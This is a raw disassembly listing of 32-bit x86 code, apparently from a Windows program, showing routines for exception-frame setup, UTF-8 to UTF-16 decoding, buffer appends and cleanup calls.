  404b37:	eb 18                	jmp    0x404b51
  404b39:	85 d2                	test   %edx,%edx
  404b3b:	74 0b                	je     0x404b48
  404b3d:	56                   	push   %esi
  404b3e:	52                   	push   %edx
  404b3f:	50                   	push   %eax
  404b40:	e8 34 1d 00 00       	call   0x406879
  404b45:	83 c4 0c             	add    $0xc,%esp
  404b48:	89 f0                	mov    %esi,%eax
  404b4a:	85 c0                	test   %eax,%eax
  404b4c:	74 0a                	je     0x404b58
  404b4e:	89 43 04             	mov    %eax,0x4(%ebx)
  404b51:	89 2b                	mov    %ebp,(%ebx)
  404b53:	be 01 00 00 80       	mov    $0x80000001,%esi
  404b58:	89 f0                	mov    %esi,%eax
  404b5a:	89 fa                	mov    %edi,%edx
  404b5c:	83 c4 08             	add    $0x8,%esp
  404b5f:	5e                   	pop    %esi
  404b60:	5f                   	pop    %edi
  404b61:	5b                   	pop    %ebx
  404b62:	5d                   	pop    %ebp
  404b63:	c3                   	ret
  404b64:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404b68:	ba 04 00 00 00       	mov    $0x4,%edx
  404b6d:	6a 08                	push   $0x8
  404b6f:	e8 7f fe ff ff       	call   0x4049f3
  404b74:	83 c4 04             	add    $0x4,%esp
  404b77:	c3                   	ret
  404b78:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404b7c:	ba 02 00 00 00       	mov    $0x2,%edx
  404b81:	6a 02                	push   $0x2
  404b83:	e8 6b fe ff ff       	call   0x4049f3
  404b88:	83 c4 04             	add    $0x4,%esp
  404b8b:	c3                   	ret
  404b8c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404b90:	31 d2                	xor    %edx,%edx
  404b92:	42                   	inc    %edx
  404b93:	6a 01                	push   $0x1
  404b95:	e8 59 fe ff ff       	call   0x4049f3
  404b9a:	83 c4 04             	add    $0x4,%esp
  404b9d:	c3                   	ret
  404b9e:	55                   	push   %ebp
  404b9f:	89 e5                	mov    %esp,%ebp
  404ba1:	53                   	push   %ebx
  404ba2:	57                   	push   %edi
  404ba3:	56                   	push   %esi
  404ba4:	83 ec 1c             	sub    $0x1c,%esp
  404ba7:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404baa:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404bad:	8b 7d 10             	mov    0x10(%ebp),%edi
  404bb0:	8b 45 0c             	mov    0xc(%ebp),%eax
  404bb3:	8d 75 d8             	lea    -0x28(%ebp),%esi
  404bb6:	89 61 fc             	mov    %esp,-0x4(%ecx)
  404bb9:	c7 41 08 ff ff ff ff 	movl   $0xffffffff,0x8(%ecx)
  404bc0:	c7 41 04 10 4d 40 00 	movl   $0x404d10,0x4(%ecx)
  404bc7:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  404bce:	89 11                	mov    %edx,(%ecx)
  404bd0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404bd7:	89 f1                	mov    %esi,%ecx
  404bd9:	8b 53 08             	mov    0x8(%ebx),%edx
  404bdc:	57                   	push   %edi
  404bdd:	50                   	push   %eax
  404bde:	e8 f9 fa ff ff       	call   0x4046dc
  404be3:	83 c4 08             	add    $0x8,%esp
  404be6:	8a 0e                	mov    (%esi),%cl
  404be8:	80 f9 04             	cmp    $0x4,%cl
  404beb:	74 26                	je     0x404c13
  404bed:	80 3b 04             	cmpb   $0x4,(%ebx)
  404bf0:	74 15                	je     0x404c07
  404bf2:	88 4d e3             	mov    %cl,-0x1d(%ebp)
  404bf5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404bf8:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  404bff:	e8 33 f6 ff ff       	call   0x404237
  404c04:	8a 4d e3             	mov    -0x1d(%ebp),%cl
  404c07:	f2 0f 10 45 d8       	movsd  -0x28(%ebp),%xmm0
  404c0c:	8b 45 08             	mov    0x8(%ebp),%eax
  404c0f:	f2 0f 11 00          	movsd  %xmm0,(%eax)
  404c13:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404c16:	80 f9 04             	cmp    $0x4,%cl
  404c19:	0f 95 c0             	setne  %al
  404c1c:	64 89 15 00 00 00 00 	mov    %edx,%fs:0x0
  404c23:	83 c4 1c             	add    $0x1c,%esp
  404c26:	5e                   	pop    %esi
  404c27:	5f                   	pop    %edi
  404c28:	5b                   	pop    %ebx
  404c29:	5d                   	pop    %ebp
  404c2a:	c3                   	ret
  404c2b:	55                   	push   %ebp
  404c2c:	83 ec 08             	sub    $0x8,%esp
  404c2f:	83 c5 0c             	add    $0xc,%ebp
  404c32:	f2 0f 10 45 d8       	movsd  -0x28(%ebp),%xmm0
  404c37:	8b 45 08             	mov    0x8(%ebp),%eax
  404c3a:	f2 0f 11 00          	movsd  %xmm0,(%eax)
  404c3e:	83 c4 08             	add    $0x8,%esp
  404c41:	5d                   	pop    %ebp
  404c42:	c3                   	ret
  404c43:	55                   	push   %ebp
  404c44:	89 e5                	mov    %esp,%ebp
  404c46:	53                   	push   %ebx
  404c47:	57                   	push   %edi
  404c48:	56                   	push   %esi
  404c49:	83 ec 1c             	sub    $0x1c,%esp
  404c4c:	8d 55 e8             	lea    -0x18(%ebp),%edx
  404c4f:	8b 7d 08             	mov    0x8(%ebp),%edi
  404c52:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404c55:	8b 45 0c             	mov    0xc(%ebp),%eax
  404c58:	89 62 fc             	mov    %esp,-0x4(%edx)
  404c5b:	c7 42 08 ff ff ff ff 	movl   $0xffffffff,0x8(%edx)
  404c62:	c7 42 04 20 4d 40 00 	movl   $0x404d20,0x4(%edx)
  404c69:	64 8b 35 00 00 00 00 	mov    %fs:0x0,%esi
  404c70:	89 32                	mov    %esi,(%edx)
  404c72:	64 89 15 00 00 00 00 	mov    %edx,%fs:0x0
  404c79:	8d 75 d8             	lea    -0x28(%ebp),%esi
  404c7c:	51                   	push   %ecx
  404c7d:	50                   	push   %eax
  404c7e:	ff 77 08             	push   0x8(%edi)
  404c81:	56                   	push   %esi
  404c82:	e8 c5 09 00 00       	call   0x40564c
  404c87:	83 c4 10             	add    $0x10,%esp
  404c8a:	8a 0e                	mov    (%esi),%cl
  404c8c:	80 f9 04             	cmp    $0x4,%cl
  404c8f:	74 26                	je     0x404cb7
  404c91:	80 3f 04             	cmpb   $0x4,(%edi)
  404c94:	74 15                	je     0x404cab
  404c96:	88 4d e3             	mov    %cl,-0x1d(%ebp)
  404c99:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404c9c:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  404ca3:	e8 8f f5 ff ff       	call   0x404237
  404ca8:	8a 4d e3             	mov    -0x1d(%ebp),%cl
  404cab:	f2 0f 10 45 d8       	movsd  -0x28(%ebp),%xmm0
  404cb0:	8b 45 08             	mov    0x8(%ebp),%eax
  404cb3:	f2 0f 11 00          	movsd  %xmm0,(%eax)
  404cb7:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404cba:	80 f9 04             	cmp    $0x4,%cl
  404cbd:	0f 95 c0             	setne  %al
  404cc0:	64 89 15 00 00 00 00 	mov    %edx,%fs:0x0
  404cc7:	83 c4 1c             	add    $0x1c,%esp
  404cca:	5e                   	pop    %esi
  404ccb:	5f                   	pop    %edi
  404ccc:	5b                   	pop    %ebx
  404ccd:	5d                   	pop    %ebp
  404cce:	c3                   	ret
  404ccf:	55                   	push   %ebp
  404cd0:	83 ec 10             	sub    $0x10,%esp
  404cd3:	83 c5 0c             	add    $0xc,%ebp
  404cd6:	f2 0f 10 45 d8       	movsd  -0x28(%ebp),%xmm0
  404cdb:	8b 45 08             	mov    0x8(%ebp),%eax
  404cde:	f2 0f 11 00          	movsd  %xmm0,(%eax)
  404ce2:	83 c4 10             	add    $0x10,%esp
  404ce5:	5d                   	pop    %ebp
  404ce6:	c3                   	ret
  404ce7:	cc                   	int3
  404ce8:	cc                   	int3
  404ce9:	cc                   	int3
  404cea:	cc                   	int3
  404ceb:	cc                   	int3
  404cec:	cc                   	int3
  404ced:	cc                   	int3
  404cee:	cc                   	int3
  404cef:	cc                   	int3
  404cf0:	b8 74 f0 92 00       	mov    $0x92f074,%eax
  404cf5:	e9 ee 84 01 00       	jmp    0x41d1e8
  404cfa:	cc                   	int3
  404cfb:	cc                   	int3
  404cfc:	cc                   	int3
  404cfd:	cc                   	int3
  404cfe:	cc                   	int3
  404cff:	cc                   	int3
  404d00:	b8 a0 f0 92 00       	mov    $0x92f0a0,%eax
  404d05:	e9 de 84 01 00       	jmp    0x41d1e8
  404d0a:	cc                   	int3
  404d0b:	cc                   	int3
  404d0c:	cc                   	int3
  404d0d:	cc                   	int3
  404d0e:	cc                   	int3
  404d0f:	cc                   	int3
  404d10:	b8 cc f0 92 00       	mov    $0x92f0cc,%eax
  404d15:	e9 ce 84 01 00       	jmp    0x41d1e8
  404d1a:	cc                   	int3
  404d1b:	cc                   	int3
  404d1c:	cc                   	int3
  404d1d:	cc                   	int3
  404d1e:	cc                   	int3
  404d1f:	cc                   	int3
  404d20:	b8 f8 f0 92 00       	mov    $0x92f0f8,%eax
  404d25:	e9 be 84 01 00       	jmp    0x41d1e8
  404d2a:	cc                   	int3
  404d2b:	cc                   	int3
  404d2c:	55                   	push   %ebp
  404d2d:	53                   	push   %ebx
  404d2e:	57                   	push   %edi
  404d2f:	56                   	push   %esi
  404d30:	83 39 01             	cmpl   $0x1,(%ecx)
  404d33:	0f 85 48 01 00 00    	jne    0x404e81
  404d39:	8b 41 0c             	mov    0xc(%ecx),%eax
  404d3c:	8b 79 04             	mov    0x4(%ecx),%edi
  404d3f:	8b 71 08             	mov    0x8(%ecx),%esi
  404d42:	0f b7 51 14          	movzwl 0x14(%ecx),%edx
  404d46:	8b 59 10             	mov    0x10(%ecx),%ebx
  404d49:	85 c0                	test   %eax,%eax
  404d4b:	74 10                	je     0x404d5d
  404d4d:	66 85 d2             	test   %dx,%dx
  404d50:	75 51                	jne    0x404da3
  404d52:	39 d8                	cmp    %ebx,%eax
  404d54:	75 58                	jne    0x404dae
  404d56:	c7 41 0c 00 00 00 00 	movl   $0x0,0xc(%ecx)
  404d5d:	85 ff                	test   %edi,%edi
  404d5f:	74 23                	je     0x404d84
  404d61:	39 f7                	cmp    %esi,%edi
  404d63:	74 1f                	je     0x404d84
  404d65:	8d 6f 08             	lea    0x8(%edi),%ebp
  404d68:	31 d2                	xor    %edx,%edx
  404d6a:	89 69 04             	mov    %ebp,0x4(%ecx)
  404d6d:	8b 07                	mov    (%edi),%eax
  404d6f:	8b 5f 04             	mov    0x4(%edi),%ebx
  404d72:	89 ef                	mov    %ebp,%edi
  404d74:	01 c3                	add    %eax,%ebx
  404d76:	89 41 0c             	mov    %eax,0xc(%ecx)
  404d79:	89 59 10             	mov    %ebx,0x10(%ecx)
  404d7c:	66 c7 41 14 00 00    	movw   $0x0,0x14(%ecx)
  404d82:	eb c5                	jmp    0x404d49
  404d84:	8b 41 18             	mov    0x18(%ecx),%eax
  404d87:	85 c0                	test   %eax,%eax
  404d89:	0f 84 ec 00 00 00    	je     0x404e7b
  404d8f:	0f b7 51 20          	movzwl 0x20(%ecx),%edx
  404d93:	66 85 d2             	test   %dx,%dx
  404d96:	74 7c                	je     0x404e14
  404d98:	66 c7 41 20 00 00    	movw   $0x0,0x20(%ecx)
  404d9e:	e9 3a 01 00 00       	jmp    0x404edd
  404da3:	66 c7 41 14 00 00    	movw   $0x0,0x14(%ecx)
  404da9:	e9 2f 01 00 00       	jmp    0x404edd
  404dae:	8d 50 01             	lea    0x1(%eax),%edx
  404db1:	89 51 0c             	mov    %edx,0xc(%ecx)
  404db4:	8a 18                	mov    (%eax),%bl
  404db6:	0f b6 d3             	movzbl %bl,%edx
  404db9:	84 db                	test   %bl,%bl
  404dbb:	0f 89 1c 01 00 00    	jns    0x404edd
  404dc1:	8d 70 02             	lea    0x2(%eax),%esi
  404dc4:	83 e2 1f             	and    $0x1f,%edx
  404dc7:	89 71 0c             	mov    %esi,0xc(%ecx)
  404dca:	0f b6 78 01          	movzbl 0x1(%eax),%edi
  404dce:	83 e7 3f             	and    $0x3f,%edi
  404dd1:	80 fb df             	cmp    $0xdf,%bl
  404dd4:	0f 86 c1 00 00 00    	jbe    0x404e9b
  404dda:	8d 70 03             	lea    0x3(%eax),%esi
  404ddd:	c1 e7 06             	shl    $0x6,%edi
  404de0:	89 71 0c             	mov    %esi,0xc(%ecx)
  404de3:	0f b6 70 02          	movzbl 0x2(%eax),%esi
  404de7:	83 e6 3f             	and    $0x3f,%esi
  404dea:	09 fe                	or     %edi,%esi
  404dec:	80 fb f0             	cmp    $0xf0,%bl
  404def:	0f 82 ad 00 00 00    	jb     0x404ea2
  404df5:	8d 78 04             	lea    0x4(%eax),%edi
  404df8:	83 e2 07             	and    $0x7,%edx
  404dfb:	c1 e6 06             	shl    $0x6,%esi
  404dfe:	89 79 0c             	mov    %edi,0xc(%ecx)
  404e01:	c1 e2 12             	shl    $0x12,%edx
  404e04:	0f b6 40 03          	movzbl 0x3(%eax),%eax
  404e08:	83 e0 3f             	and    $0x3f,%eax
  404e0b:	09 f0                	or     %esi,%eax
  404e0d:	09 c2                	or     %eax,%edx
  404e0f:	e9 93 00 00 00       	jmp    0x404ea7
  404e14:	3b 41 1c             	cmp    0x1c(%ecx),%eax
  404e17:	74 5b                	je     0x404e74
  404e19:	8d 50 01             	lea    0x1(%eax),%edx
  404e1c:	89 51 18             	mov    %edx,0x18(%ecx)
  404e1f:	8a 18                	mov    (%eax),%bl
  404e21:	0f b6 d3             	movzbl %bl,%edx
  404e24:	84 db                	test   %bl,%bl
  404e26:	0f 89 b1 00 00 00    	jns    0x404edd
  404e2c:	8d 70 02             	lea    0x2(%eax),%esi
  404e2f:	83 e2 1f             	and    $0x1f,%edx
  404e32:	89 71 18             	mov    %esi,0x18(%ecx)
  404e35:	0f b6 78 01          	movzbl 0x1(%eax),%edi
  404e39:	83 e7 3f             	and    $0x3f,%edi
  404e3c:	80 fb df             	cmp    $0xdf,%bl
  404e3f:	76 5a                	jbe    0x404e9b
  404e41:	8d 70 03             	lea    0x3(%eax),%esi
  404e44:	c1 e7 06             	shl    $0x6,%edi
  404e47:	89 71 18             	mov    %esi,0x18(%ecx)
  404e4a:	0f b6 70 02          	movzbl 0x2(%eax),%esi
  404e4e:	83 e6 3f             	and    $0x3f,%esi
  404e51:	09 fe                	or     %edi,%esi
  404e53:	80 fb f0             	cmp    $0xf0,%bl
  404e56:	72 78                	jb     0x404ed0
  404e58:	8d 78 04             	lea    0x4(%eax),%edi
  404e5b:	83 e2 07             	and    $0x7,%edx
  404e5e:	c1 e6 06             	shl    $0x6,%esi
  404e61:	89 79 18             	mov    %edi,0x18(%ecx)
  404e64:	c1 e2 12             	shl    $0x12,%edx
  404e67:	0f b6 40 03          	movzbl 0x3(%eax),%eax
  404e6b:	83 e0 3f             	and    $0x3f,%eax
  404e6e:	09 f0                	or     %esi,%eax
  404e70:	09 c2                	or     %eax,%edx
  404e72:	eb 61                	jmp    0x404ed5
  404e74:	c7 41 18 00 00 00 00 	movl   $0x0,0x18(%ecx)
  404e7b:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  404e81:	0f b7 41 24          	movzwl 0x24(%ecx),%eax
  404e85:	66 83 f8 02          	cmp    $0x2,%ax
  404e89:	75 04                	jne    0x404e8f
  404e8b:	31 c0                	xor    %eax,%eax
  404e8d:	eb 51                	jmp    0x404ee0
  404e8f:	0f b7 51 26          	movzwl 0x26(%ecx),%edx
  404e93:	66 c7 41 24 00 00    	movw   $0x0,0x24(%ecx)
  404e99:	eb 45                	jmp    0x404ee0
  404e9b:	c1 e2 06             	shl    $0x6,%edx
  404e9e:	09 fa                	or     %edi,%edx
  404ea0:	eb 3b                	jmp    0x404edd
  404ea2:	c1 e2 0c             	shl    $0xc,%edx
  404ea5:	09 f2                	or     %esi,%edx
  404ea7:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
  404ead:	76 2e                	jbe    0x404edd
  404eaf:	8d b2 00 00 ff 00    	lea    0xff0000(%edx),%esi
  404eb5:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
  404ebb:	c1 ee 0a             	shr    $0xa,%esi
  404ebe:	81 ca 00 dc 00 00    	or     $0xdc00,%edx
  404ec4:	81 ce 00 d8 00 00    	or     $0xd800,%esi
  404eca:	66 89 51 14          	mov    %dx,0x14(%ecx)
  404ece:	eb 34                	jmp    0x404f04
  404ed0:	c1 e2 0c             	shl    $0xc,%edx
  404ed3:	09 f2                	or     %esi,%edx
  404ed5:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
  404edb:	77 08                	ja     0x404ee5
  404edd:	31 c0                	xor    %eax,%eax
  404edf:	40                   	inc    %eax
  404ee0:	5e                   	pop    %esi
  404ee1:	5f                   	pop    %edi
  404ee2:	5b                   	pop    %ebx
  404ee3:	5d                   	pop    %ebp
  404ee4:	c3                   	ret
  404ee5:	8d b2 00 00 ff 00    	lea    0xff0000(%edx),%esi
  404eeb:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
  404ef1:	c1 ee 0a             	shr    $0xa,%esi
  404ef4:	81 ca 00 dc 00 00    	or     $0xdc00,%edx
  404efa:	81 ce 00 d8 00 00    	or     $0xd800,%esi
  404f00:	66 89 51 20          	mov    %dx,0x20(%ecx)
  404f04:	31 c0                	xor    %eax,%eax
  404f06:	89 f2                	mov    %esi,%edx
  404f08:	eb d5                	jmp    0x404edf
  404f0a:	55                   	push   %ebp
  404f0b:	53                   	push   %ebx
  404f0c:	57                   	push   %edi
  404f0d:	56                   	push   %esi
  404f0e:	83 ec 0c             	sub    $0xc,%esp
  404f11:	0f b7 42 24          	movzwl 0x24(%edx),%eax
  404f15:	83 3a 01             	cmpl   $0x1,(%edx)
  404f18:	89 cd                	mov    %ecx,%ebp
  404f1a:	0f b7 c8             	movzwl %ax,%ecx
  404f1d:	0f 85 a6 00 00 00    	jne    0x404fc9
  404f23:	89 d6                	mov    %edx,%esi
  404f25:	66 83 f8 02          	cmp    $0x2,%ax
  404f29:	0f 85 b2 00 00 00    	jne    0x404fe1
  404f2f:	8b 46 0c             	mov    0xc(%esi),%eax
  404f32:	31 db                	xor    %ebx,%ebx
  404f34:	bf 00 00 00 00       	mov    $0x0,%edi
  404f39:	ba 00 00 00 00       	mov    $0x0,%edx
  404f3e:	85 c0                	test   %eax,%eax
  404f40:	74 26                	je     0x404f68
  404f42:	8b 7e 10             	mov    0x10(%esi),%edi
  404f45:	31 c9                	xor    %ecx,%ecx
  404f47:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
  404f4c:	29 c7                	sub    %eax,%edi
  404f4e:	66 83 7e 14 00       	cmpw   $0x0,0x14(%esi)
  404f53:	89 f8                	mov    %edi,%eax
  404f55:	0f 95 c1             	setne  %cl
  404f58:	f7 e2                	mul    %edx
  404f5a:	d1 ea                	shr    $1,%edx
  404f5c:	01 ca                	add    %ecx,%edx
  404f5e:	3d 56 55 55 55       	cmp    $0x55555556,%eax
  404f63:	83 da ff             	sbb    $0xffffffff,%edx
  404f66:	01 cf                	add    %ecx,%edi
  404f68:	8b 46 18             	mov    0x18(%esi),%eax
  404f6b:	89 54 24 04          	mov    %edx,0x4(%esp)
  404f6f:	ba 00 00 00 00       	mov    $0x0,%edx
  404f74:	85 c0                	test   %eax,%eax
  404f76:	74 26                	je     0x404f9e
  404f78:	8b 5e 1c             	mov    0x1c(%esi),%ebx
  404f7b:	31 c9                	xor    %ecx,%ecx
  404f7d:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
  404f82:	29 c3                	sub    %eax,%ebx
  404f84:	66 83 7e 20 00       	cmpw   $0x0,0x20(%esi)
  404f89:	89 d8                	mov    %ebx,%eax
  404f8b:	0f 95 c1             	setne  %cl
  404f8e:	f7 e2                	mul    %edx
  404f90:	d1 ea                	shr    $1,%edx
  404f92:	01 ca                	add    %ecx,%edx
  404f94:	3d 56 55 55 55       	cmp    $0x55555556,%eax
  404f99:	83 da ff             	sbb    $0xffffffff,%edx
  404f9c:	01 cb                	add    %ecx,%ebx
  404f9e:	8b 46 04             	mov    0x4(%esi),%eax
  404fa1:	85 c0                	test   %eax,%eax
  404fa3:	74 07                	je     0x404fac
  404fa5:	31 c9                	xor    %ecx,%ecx
  404fa7:	39 46 08             	cmp    %eax,0x8(%esi)
  404faa:	75 0c                	jne    0x404fb8
  404fac:	01 fb                	add    %edi,%ebx
  404fae:	31 c9                	xor    %ecx,%ecx
  404fb0:	39 fb                	cmp    %edi,%ebx
  404fb2:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404fb5:	0f 93 c1             	setae  %cl
  404fb8:	03 54 24 04          	add    0x4(%esp),%edx
  404fbc:	b8 04 00 00 00       	mov    $0x4,%eax
  404fc1:	89 55 00             	mov    %edx,0x0(%ebp)
  404fc4:	e9 e6 00 00 00       	jmp    0x4050af
  404fc9:	66 83 f8 02          	cmp    $0x2,%ax
  404fcd:	0f 85 cd 00 00 00    	jne    0x4050a0
  404fd3:	31 c9                	xor    %ecx,%ecx
  404fd5:	c7 45 00 00 00 00 00 	movl   $0x0,0x0(%ebp)
  404fdc:	e9 c2 00 00 00       	jmp    0x4050a3
  404fe1:	8b 46 0c             	mov    0xc(%esi),%eax
  404fe4:	31 ff                	xor    %edi,%edi
  404fe6:	bb 00 00 00 00       	mov    $0x0,%ebx
  404feb:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  404fef:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404ff6:	00 
  404ff7:	85 c0                	test   %eax,%eax
  404ff9:	74 34                	je     0x40502f
  404ffb:	8b 6e 10             	mov    0x10(%esi),%ebp
  404ffe:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
  405003:	29 c5                	sub    %eax,%ebp
  405005:	31 c0                	xor    %eax,%eax
  405007:	66 83 7e 14 00       	cmpw   $0x0,0x14(%esi)
  40500c:	0f 95 c0             	setne  %al
  40500f:	89 44 24 04          	mov    %eax,0x4(%esp)
  405013:	89 e8                	mov    %ebp,%eax
  405015:	f7 e2                	mul    %edx
  405017:	89 d3                	mov    %edx,%ebx
  405019:	8b 54 24 04          	mov    0x4(%esp),%edx
  40501d:	d1 eb                	shr    $1,%ebx
  40501f:	01 d3                	add    %edx,%ebx
  405021:	3d 56 55 55 55       	cmp    $0x55555556,%eax
  405026:	83 db ff             	sbb    $0xffffffff,%ebx
  405029:	01 d5                	add    %edx,%ebp
  40502b:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40502f:	8b 46 18             	mov    0x18(%esi),%eax
  405032:	ba 00 00 00 00       	mov    $0x0,%edx
  405037:	85 c0                	test   %eax,%eax
  405039:	74 28                	je     0x405063
  40503b:	8b 7e 1c             	mov    0x1c(%esi),%edi
  40503e:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
  405043:	29 c7                	sub    %eax,%edi
  405045:	31 c0                	xor    %eax,%eax
  405047:	66 83 7e 20 00       	cmpw   $0x0,0x20(%esi)
  40504c:	0f 95 c0             	setne  %al
  40504f:	89 c5                	mov    %eax,%ebp
  405051:	89 f8                	mov    %edi,%eax
  405053:	f7 e2                	mul    %edx
  405055:	d1 ea                	shr    $1,%edx
  405057:	01 ea                	add    %ebp,%edx
  405059:	3d 56 55 55 55       	cmp    $0x55555556,%eax
  40505e:	83 da ff             	sbb    $0xffffffff,%edx
  405061:	01 ef                	add    %ebp,%edi
  405063:	8b 46 04             	mov    0x4(%esi),%eax
  405066:	8b 6c 24 04          	mov    0x4(%esp),%ebp
  40506a:	85 c0                	test   %eax,%eax
  40506c:	0f 94 44 24 03       	sete   0x3(%esp)
  405071:	39 46 08             	cmp    %eax,0x8(%esi)
  405074:	0f 94 c4             	sete   %ah
  405077:	01 ef                	add    %ebp,%edi
  405079:	0a 64 24 03          	or     0x3(%esp),%ah
  40507d:	39 ef                	cmp    %ebp,%edi
  40507f:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  405083:	0f 93 c0             	setae  %al
  405086:	01 d3                	add    %edx,%ebx
  405088:	01 cb                	add    %ecx,%ebx
  40508a:	01 f9                	add    %edi,%ecx
  40508c:	20 e0                	and    %ah,%al
  40508e:	39 f9                	cmp    %edi,%ecx
  405090:	89 5d 00             	mov    %ebx,0x0(%ebp)
  405093:	0f 93 c2             	setae  %dl
  405096:	20 c2                	and    %al,%dl
  405098:	0f b6 c2             	movzbl %dl,%eax
  40509b:	89 45 04             	mov    %eax,0x4(%ebp)
  40509e:	eb 0a                	jmp    0x4050aa
  4050a0:	89 4d 00             	mov    %ecx,0x0(%ebp)
  4050a3:	c7 45 04 01 00 00 00 	movl   $0x1,0x4(%ebp)
  4050aa:	b8 08 00 00 00       	mov    $0x8,%eax
  4050af:	89 4c 05 00          	mov    %ecx,0x0(%ebp,%eax,1)
  4050b3:	89 e8                	mov    %ebp,%eax
  4050b5:	83 c4 0c             	add    $0xc,%esp
  4050b8:	5e                   	pop    %esi
  4050b9:	5f                   	pop    %edi
  4050ba:	5b                   	pop    %ebx
  4050bb:	5d                   	pop    %ebp
  4050bc:	c3                   	ret
  4050bd:	55                   	push   %ebp
  4050be:	89 e5                	mov    %esp,%ebp
  4050c0:	53                   	push   %ebx
  4050c1:	57                   	push   %edi
  4050c2:	56                   	push   %esi
  4050c3:	83 ec 18             	sub    $0x18,%esp
  4050c6:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4050c9:	89 60 fc             	mov    %esp,-0x4(%eax)
  4050cc:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  4050d3:	c7 40 04 d0 55 40 00 	movl   $0x4055d0,0x4(%eax)
  4050da:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  4050e1:	89 10                	mov    %edx,(%eax)
  4050e3:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4050e9:	8b 01                	mov    (%ecx),%eax
  4050eb:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4050ee:	8b 41 04             	mov    0x4(%ecx),%eax
  4050f1:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4050f4:	8b 00                	mov    (%eax),%eax
  4050f6:	85 c0                	test   %eax,%eax
  4050f8:	74 0f                	je     0x405109
  4050fa:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  405101:	ff 75 dc             	push   -0x24(%ebp)
  405104:	ff d0                	call   *%eax
  405106:	83 c4 04             	add    $0x4,%esp
  405109:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40510c:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40510f:	8b 42 04             	mov    0x4(%edx),%eax
  405112:	85 c0                	test   %eax,%eax
  405114:	74 0d                	je     0x405123
  405116:	ff 72 08             	push   0x8(%edx)
  405119:	50                   	push   %eax
  40511a:	51                   	push   %ecx
  40511b:	e8 59 17 00 00       	call   0x406879
  405120:	83 c4 0c             	add    $0xc,%esp
  405123:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405126:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40512c:	83 c4 18             	add    $0x18,%esp
  40512f:	5e                   	pop    %esi
  405130:	5f                   	pop    %edi
  405131:	5b                   	pop    %ebx
  405132:	5d                   	pop    %ebp
  405133:	c3                   	ret
  405134:	55                   	push   %ebp
  405135:	83 ec 0c             	sub    $0xc,%esp
  405138:	83 c5 0c             	add    $0xc,%ebp
  40513b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40513e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  405141:	8b 40 04             	mov    0x4(%eax),%eax
  405144:	85 c0                	test   %eax,%eax
  405146:	74 10                	je     0x405158
  405148:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40514b:	ff 72 08             	push   0x8(%edx)
  40514e:	50                   	push   %eax
  40514f:	51                   	push   %ecx
  405150:	e8 24 17 00 00       	call   0x406879
  405155:	83 c4 0c             	add    $0xc,%esp
  405158:	83 c4 0c             	add    $0xc,%esp
  40515b:	5d                   	pop    %ebp
  40515c:	c3                   	ret
  40515d:	53                   	push   %ebx
  40515e:	57                   	push   %edi
  40515f:	56                   	push   %esi
  405160:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405164:	8b 74 24 18          	mov    0x18(%esp),%esi
  405168:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40516c:	8b 0f                	mov    (%edi),%ecx
  40516e:	8b 47 08             	mov    0x8(%edi),%eax
  405171:	29 c1                	sub    %eax,%ecx
  405173:	39 ce                	cmp    %ecx,%esi
  405175:	77 15                	ja     0x40518c
  405177:	03 47 04             	add    0x4(%edi),%eax
  40517a:	56                   	push   %esi
  40517b:	53                   	push   %ebx
  40517c:	50                   	push   %eax
  40517d:	e8 9e 80 01 00       	call   0x41d220
  405182:	83 c4 0c             	add    $0xc,%esp
  405185:	01 77 08             	add    %esi,0x8(%edi)
  405188:	5e                   	pop    %esi
  405189:	5f                   	pop    %edi
  40518a:	5b                   	pop    %ebx
  40518b:	c3                   	ret
  40518c:	31 c9                	xor    %ecx,%ecx
  40518e:	41                   	inc    %ecx
  40518f:	51                   	push   %ecx
  405190:	51                   	push   %ecx
  405191:	56                   	push   %esi
  405192:	50                   	push   %eax
  405193:	57                   	push   %edi
  405194:	e8 38 5e 02 00       	call   0x42afd1
  405199:	83 c4 14             	add    $0x14,%esp
  40519c:	8b 47 08             	mov    0x8(%edi),%eax
  40519f:	eb d6                	jmp    0x405177
  4051a1:	c3                   	ret
  4051a2:	55                   	push   %ebp
  4051a3:	89 e5                	mov    %esp,%ebp
  4051a5:	53                   	push   %ebx
  4051a6:	57                   	push   %edi
  4051a7:	56                   	push   %esi
